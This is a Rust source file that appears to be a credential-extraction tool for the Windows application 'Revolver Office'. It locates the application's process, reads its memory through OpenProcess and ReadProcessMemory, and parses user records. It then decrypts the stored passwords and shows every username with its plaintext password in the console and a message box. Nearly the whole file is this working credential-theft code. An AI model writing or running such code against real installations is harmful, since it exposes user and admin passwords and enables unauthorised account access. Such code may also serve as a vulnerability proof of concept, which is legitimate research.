use std::{fmt::Write, ptr, slice, str};

use windows::{
    core::{s, PCSTR},
    Win32::{
        Foundation::HANDLE,
        System::{
            Diagnostics::{
                Debug::ReadProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
                    TH32CS_SNAPPROCESS,
                },
            },
            Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT},
            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
        },
        UI::WindowsAndMessaging::{MessageBoxA, MB_OK},
    },
};

mod decrypt;

#[derive(thiserror::Error, Debug)]
enum Error {
    #[error("base64 decode error")]
    Decrypt(#[from] decrypt::Error),

    #[error("Win32 error")]
    Win32(#[from] windows_result::Error),

    #[error("utf8 error")]
    UTF8Decode(#[from] std::str::Utf8Error),

    #[error("revolver process not found")]
    RevolverProcessNotFound,
}

fn i8_cstr_slice_to_str(cstr: &[i8]) -> Result<&str, std::str::Utf8Error> {
    let chars: &[u8] = unsafe { slice::from_raw_parts(cstr.as_ptr().cast(), cstr.len()) };

    let end = chars.iter().position(|c| *c == 0).unwrap_or(chars.len());
    let chars = &chars[..end];

    str::from_utf8(chars)
}

fn process_by_name(name: &str) -> Result<Option<u32>, Error> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;
        let mut procentry = PROCESSENTRY32 {
            dwSize: size_of::<PROCESSENTRY32>()
                .try_into()
                .expect("Size of PROCESSENTRY32 too large"),
            ..Default::default()
        };

        let mut result = Process32First(snapshot, &mut procentry);
        while result.is_ok() {
            if let Ok(proc_name) = i8_cstr_slice_to_str(procentry.szExeFile.as_slice()) {
                if proc_name == name {
                    return Ok(Some(procentry.th32ProcessID));
                }
            }
            result = Process32Next(snapshot, &mut procentry);
        }
    }

    Ok(None)
}

#[derive(Debug)]
struct ProcessMemoryRegions {
    proc_handle: HANDLE,
    current_virtual_address: *const std::ffi::c_void,
}

impl ProcessMemoryRegions {
    const fn new(proc_handle: HANDLE) -> Self {
        Self {
            proc_handle,
            current_virtual_address: ptr::null(),
        }
    }
}

impl Iterator for ProcessMemoryRegions {
    type Item = Vec<u8>;

    fn next(&mut self) -> Option<Self::Item> {
        let mut meminfo = MEMORY_BASIC_INFORMATION::default();

        unsafe {
            while meminfo.State != MEM_COMMIT {
                if VirtualQueryEx(
                    self.proc_handle,
                    Some(self.current_virtual_address),
                    &mut meminfo,
                    size_of_val(&meminfo),
                ) == 0
                {
                    return None;
                }

                self.current_virtual_address = self.current_virtual_address.add(meminfo.RegionSize);
            }
        }

        let mut mem = vec![0; meminfo.RegionSize];
        let mut read = 0;
        let _ = unsafe {
            ReadProcessMemory(
                self.proc_handle,
                meminfo.BaseAddress,
                mem.as_mut_ptr().cast(),
                mem.len(),
                Some(&mut read),
            )
        };
        mem.truncate(read);

        Some(mem)
    }
}

trait SlicePosition<T> {
    fn position(&self, search: &[T]) -> Option<usize>;
    fn starting_at_position(&self, search: &[T]) -> Option<Self>
    where
        Self: Sized;
}

impl<T: PartialEq> SlicePosition<T> for &[T] {
    fn position(&self, search: &[T]) -> Option<usize> {
        self.windows(search.len()).position(|win| win == search)
    }

    fn starting_at_position(&self, search: &[T]) -> Option<Self> {
        self.position(search).map(|pos| &self[pos + search.len()..])
    }
}

#[derive(Debug, PartialEq)]
struct User {
    username_initials: String,
    plaintext_pw: String,
}

impl User {
    fn try_from_parsed_data(data: &[u8]) -> Option<Self> {
        let data = &data[..data.position(b"false")?];
        if &data[data.len() - 4..] != b"0801" {
            // 0801 -- User
            // 1801 -- Admin
            return None;
        }
        let data = &data[..data.len() - 4];

        let username_padding = {
            let p = data.len() % 4;
            if p == 0 {
                4
            } else {
                p
            }
        };

        let mut username_length = username_padding;
        while username_length < data.len() {
            let encrypted_pw_b64 = str::from_utf8(&data[username_length..]).ok()?;
            if let Ok(plaintext_pw) = decrypt::decrypt_password(encrypted_pw_b64) {
                return Some(Self {
                    username_initials: String::from_utf8_lossy(&data[..username_length]).into_owned(),
                    plaintext_pw
                });
            }

            username_length += 4;
        }

        None
    }
}

fn main() -> Result<(), Error> {
    let revolver_pid =
        process_by_name("Revolver Office.exe")?.ok_or(Error::RevolverProcessNotFound)?;

    let revolver_handle = unsafe {
        OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            revolver_pid,
        )?
    };

    let mut users: Vec<User> = Vec::new();

    for region in ProcessMemoryRegions::new(revolver_handle) {
        if let Some(db_entry) = region.as_slice().starting_at_position(b"pdfpath") {
            let db_entry = &db_entry[..0x100];
            if let Some(user_data) = db_entry.starting_at_position(b"user") {
                if let Some(u) = User::try_from_parsed_data(user_data) {
                    if !users.contains(&u) {
                        users.push(u);
                    }
                }
            }
        }
    }

    let mut desc = String::new();
    for user in users {
        writeln!(
            &mut desc,
            "{}: {}",
            user.username_initials, user.plaintext_pw
        )
        .expect("Failed to write to string");
    }

    println!("{desc}");
    unsafe {
        MessageBoxA(None, PCSTR::from_raw(desc.as_ptr()), s!("User data"), MB_OK);
    }

    Ok(())
}
